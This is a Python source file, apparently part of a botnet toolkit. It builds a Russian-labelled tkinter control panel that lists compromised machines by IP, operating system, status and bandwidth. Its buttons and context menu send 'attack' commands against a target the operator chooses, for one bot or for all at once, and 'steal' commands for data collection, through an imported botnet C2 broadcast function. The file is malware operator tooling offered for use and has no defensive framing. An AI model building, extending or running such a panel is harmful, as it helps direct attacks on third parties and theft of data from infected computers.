import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import json, os, threading
from botnet.c2 import broadcast_command
from utils.logger import log
from utils.widgets import ToolTip

class BotListTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.bot_data = []
        self.build_ui()
        self.load_bots()

    def build_ui(self):
        control_frame = ttk.Frame(self)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(control_frame, text="Обновить", command=self.load_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(control_frame, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
        
        filter_frame = ttk.Frame(self)
        filter_frame.pack(fill=tk.X, padx=5)
        ttk.Label(filter_frame, text="Фильтр:").pack(side=tk.LEFT)
        self.filter_entry = ttk.Entry(filter_frame, width=30)
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        self.filter_entry.bind("<KeyRelease>", lambda e: self.apply_filter())
        
        columns = ("ID", "IP", "OS", "Status", "Bandwidth")
        self.tree = ttk.Treeview(self, columns=columns, show="headings")
        for col in columns:
            self.tree.heading(col, text=col, command=lambda c=col: self.sort_by(c))
            self.tree.column(col, width=120)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.tree.bind("<Button-3>", self.show_context_menu)
        self.context_menu = tk.Menu(self, tearoff=0)
        self.context_menu.add_command(label="Атаковать", command=self.context_attack)
        self.context_menu.add_command(label="Сбор данных", command=self.context_steal)
        self.status_label = ttk.Label(self, text="Ботов: 0")
        self.status_label.pack(anchor=tk.W, padx=5)

    def load_bots(self):
        if os.path.exists("bots.json"):
            with open("bots.json", "r") as f:
                raw_data = json.load(f)
        else:
            raw_data = []
        self.bot_data = []
        for item in raw_data:
            if isinstance(item, dict):
                bot = item.copy()
            elif isinstance(item, str):
                bot = {"id": item, "ip": "", "os": "", "status": "offline", "bandwidth": 0}
            else:
                continue
            bot.setdefault("id", "unknown")
            bot.setdefault("ip", "")
            bot.setdefault("os", "")
            bot.setdefault("status", "offline")
            bot.setdefault("bandwidth", 0)
            self.bot_data.append(bot)
        self.populate_tree()
        self.status_label.config(text=f"Ботов: {len(self.bot_data)}")

    def populate_tree(self, filtered=None):
        self.tree.delete(*self.tree.get_children())
        data = filtered if filtered is not None else self.bot_data
        for bot in data:
            status = bot.get("status","offline")
            os_type = bot.get("os","linux")
            os_icon = {"linux":"🐧 Linux","windows":"🪟 Windows","iot":"📡 IoT"}.get(os_type, os_type)
            tag = "online" if status == "online" else "offline"
            self.tree.insert("", tk.END, values=(
                bot.get("id",""),
                bot.get("ip",""),
                os_icon,
                status,
                f"{bot.get('bandwidth',0)} Mbps"
            ), tags=(tag,))
        self.tree.tag_configure('online', foreground='green')
        self.tree.tag_configure('offline', foreground='red')

    def apply_filter(self):
        text = self.filter_entry.get().lower()
        if not text:
            self.populate_tree()
            return
        filtered = [b for b in self.bot_data if text in str(b).lower()]
        self.populate_tree(filtered)

    def sort_by(self, col):
        idx = ["id","ip","os","status","bandwidth"].index(col.lower())
        self.bot_data.sort(key=lambda b: str(b.get(col.lower(),"")))
        self.populate_tree()

    def show_context_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.context_menu.post(event.x_root, event.y_root)

    def get_selected_bot(self):
        selection = self.tree.selection()
        if selection:
            values = self.tree.item(selection[0], 'values')
            return {'id': values[0], 'ip': values[1], 'os': values[2], 'status': values[3], 'bandwidth': values[4]}
        return None

    def context_attack(self):
        bot = self.get_selected_bot()
        if bot:
            target = simpledialog.askstring("Атака", "Цель:")
            if target:
                broadcast_command({"action":"attack","target":target,"bot_id":bot['id']})

    def context_steal(self):
        bot = self.get_selected_bot()
        if bot:
            broadcast_command({"action":"steal","bot_id":bot['id']})

    def mass_attack(self):
        target = simpledialog.askstring("Массовая атака", "Цель:")
        if target:
            broadcast_command({"action":"attack","target":target})
